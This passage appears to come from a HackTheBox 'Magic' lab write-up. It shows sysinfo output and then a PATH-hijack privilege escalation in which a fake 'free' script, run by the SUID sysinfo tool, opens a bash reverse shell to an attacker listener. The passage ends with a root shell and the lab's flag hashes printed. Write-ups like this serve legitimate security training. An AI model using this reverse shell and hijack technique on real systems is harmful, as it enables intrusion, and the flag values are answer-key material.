/0/100/7.3                    bridge     82371AB/EB/MB PIIX4 ACPI
/0/100/7.7                    generic    Virtual Machine Communication Interface
/0/100/f                      display    SVGA II Adapter
/0/100/10          scsi32     storage    53c1030 PCI-X Fusion-MPT Dual Ultra320 SCSI
/0/100/10/0.1.0    /dev/sda   disk       10GB Virtual disk
/0/100/10/0.1.0/1  /dev/sda1  volume     9214MiB EXT4 volume
/0/100/10/0.1.0/2  /dev/sda2  volume     1025MiB Linux swap volume
/0/100/11                     bridge     PCI bridge
/0/100/11/0                   bus        USB1.1 UHCI Controller
/0/100/11/0/1      usb2       bus        UHCI Host Controller
/0/100/11/0/1/1               input      VMware Virtual USB Mouse
/0/100/11/0/1/2               bus        VMware Virtual USB Hub
/0/100/11/1                   bus        USB2 EHCI Controller
/0/100/11/1/1      usb1       bus        EHCI Host Controller
/0/100/11/2                   storage    SATA AHCI controller
/0/100/15                     bridge     PCI Express Root Port
/0/100/15/0        ens160     network    VMXNET3 Ethernet Controller
/0/100/15.1                   bridge     PCI Express Root Port
/0/100/15.2                   bridge     PCI Express Root Port
/0/100/15.3                   bridge     PCI Express Root Port
/0/100/15.4                   bridge     PCI Express Root Port
/0/100/15.5                   bridge     PCI Express Root Port
/0/100/15.6                   bridge     PCI Express Root Port
/0/100/15.7                   bridge     PCI Express Root Port
/0/100/16                     bridge     PCI Express Root Port
/0/100/16.1                   bridge     PCI Express Root Port
/0/100/16.2                   bridge     PCI Express Root Port
/0/100/16.3                   bridge     PCI Express Root Port
/0/100/16.4                   bridge     PCI Express Root Port
/0/100/16.5                   bridge     PCI Express Root Port
/0/100/16.6                   bridge     PCI Express Root Port
/0/100/16.7                   bridge     PCI Express Root Port
/0/100/17                     bridge     PCI Express Root Port
/0/100/17.1                   bridge     PCI Express Root Port
/0/100/17.2                   bridge     PCI Express Root Port
/0/100/17.3                   bridge     PCI Express Root Port
/0/100/17.4                   bridge     PCI Express Root Port
/0/100/17.5                   bridge     PCI Express Root Port
/0/100/17.6                   bridge     PCI Express Root Port
/0/100/17.7                   bridge     PCI Express Root Port
/0/100/18                     bridge     PCI Express Root Port
/0/100/18.1                   bridge     PCI Express Root Port
/0/100/18.2                   bridge     PCI Express Root Port
/0/100/18.3                   bridge     PCI Express Root Port
/0/100/18.4                   bridge     PCI Express Root Port
/0/100/18.5                   bridge     PCI Express Root Port
/0/100/18.6                   bridge     PCI Express Root Port
/0/100/18.7                   bridge     PCI Express Root Port
/1                            system     

====================Disk Info====================
Disk /dev/loop0: 54.7 MiB, 57294848 bytes, 111904 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop1: 160.2 MiB, 167931904 bytes, 327992 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop2: 164.8 MiB, 172761088 bytes, 337424 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop3: 243.9 MiB, 255762432 bytes, 499536 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop4: 3.7 MiB, 3862528 bytes, 7544 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop5: 99.4 MiB, 104202240 bytes, 203520 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop6: 2.5 MiB, 2621440 bytes, 5120 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop7: 219 MiB, 229638144 bytes, 448512 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/sda: 10 GiB, 10737418240 bytes, 20971520 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xf8b0a793

Device     Boot    Start      End  Sectors Size Id Type
/dev/sda1           2048 18872319 18870272   9G 83 Linux
/dev/sda2       18872320 20971519  2099200   1G 82 Linux swap / Solaris


Disk /dev/loop8: 91.4 MiB, 95805440 bytes, 187120 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop9: 548 KiB, 561152 bytes, 1096 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop10: 61.7 MiB, 64729088 bytes, 126424 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop11: 55.5 MiB, 58134528 bytes, 113544 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop12: 65.1 MiB, 68259840 bytes, 133320 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop13: 956 KiB, 978944 bytes, 1912 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop14: 44.9 MiB, 47063040 bytes, 91920 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

====================CPU Info====================
processor       : 0
vendor_id       : AuthenticAMD
cpu family      : 25
model           : 1
model name      : AMD EPYC 7513 32-Core Processor
stepping        : 1
microcode       : 0xa0011d5
cpu MHz         : 2595.124
cache size      : 512 KB
physical id     : 0
siblings        : 1
core id         : 0
cpu cores       : 1
apicid          : 0
initial apicid  : 0
fpu             : yes
fpu_exception   : yes
cpuid level     : 16
wp              : yes
flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw invpcid_single ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xsaves clzero arat pku ospke overflow_recov succor
bugs            : fxsave_leak sysret_ss_attrs spectre_v1 spectre_v2 spec_store_bypass
bogomips        : 5190.24
TLB size        : 2560 4K pages
clflush size    : 64
cache_alignment : 64
address sizes   : 43 bits physical, 48 bits virtual
power management:

processor       : 1
vendor_id       : AuthenticAMD
cpu family      : 25
model           : 1
model name      : AMD EPYC 7513 32-Core Processor
stepping        : 1
microcode       : 0xa0011d5
cpu MHz         : 2595.124
cache size      : 512 KB
physical id     : 2
siblings        : 1
core id         : 0
cpu cores       : 1
apicid          : 2
initial apicid  : 2
fpu             : yes
fpu_exception   : yes
cpuid level     : 16
wp              : yes
flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw invpcid_single ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xsaves clzero arat pku ospke overflow_recov succor
bugs            : fxsave_leak sysret_ss_attrs spectre_v1 spectre_v2 spec_store_bypass
bogomips        : 5190.24
TLB size        : 2560 4K pages
clflush size    : 64
cache_alignment : 64
address sizes   : 43 bits physical, 48 bits virtual
power management:


====================MEM Usage=====================
              total        used        free      shared  buff/cache   available
Mem:           3.8G        576M        1.8G        6.8M        1.5G        3.0G
Swap:          1.0G          0B        1.0G
theseus@magic:~$ cd tmp
theseus@magic:~/tmp$ ls -la
total 8
drwxrwxr-x  2 theseus theseus 4096 Sep  9 09:17 .
drwxr-xr-x 16 theseus theseus 4096 Sep  9 09:17 ..
theseus@magic:~/tmp$ vi free
theseus@magic:~/tmp$ chmod +x free
theseus@magic:~/tmp$ export $PATH=$(pwd):$PATH
-bash: export: `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin=/home/theseus/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin': not a valid identifier
theseus@magic:~/tmp$ export PATH=$(pwd):$PATH
theseus@magic:~/tmp$ echo $PATH
/home/theseus/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
theseus@magic:~/tmp$ free
theseus@magic:~/tmp$ sysinfo
====================Hardware Info====================
H/W path           Device     Class      Description
====================================================
                              system     VMware Virtual Platform
/0                            bus        440BX Desktop Reference Platform
/0/0                          memory     86KiB BIOS
/0/1                          processor  AMD EPYC 7513 32-Core Processor
/0/1/0                        memory     16KiB L1 cache
/0/1/1                        memory     16KiB L1 cache
```
---
use this script to 
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
```
----
```bash
┌──(sabeshan㉿kali)-[~/HTB/OSCP/Magic]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.185] 34948
root@magic:~/tmp# cat /root/root.txt
cat /root/root.txt
ffea42255b6a4ba049369df6d1f0c5ea
root@magic:~                             

root@magic:~/tmp# cd /home
cd /home
root@magic:/home# ls -la
ls -la
total 12
drwxr-xr-x  3 root    root    4096 Jul  6  2021 .
drwxr-xr-x 24 root    root    4096 Jul  6  2021 ..
drwxr-xr-x 16 theseus theseus 4096 Sep  9 09:17 theseus
root@magic:/home# cd theseus
cd theseus
root@magic:~# cat user.txt
cat user.txt
c4c685d76b12adc2c4a906c7127925ba
root@magic:~# 
```
---
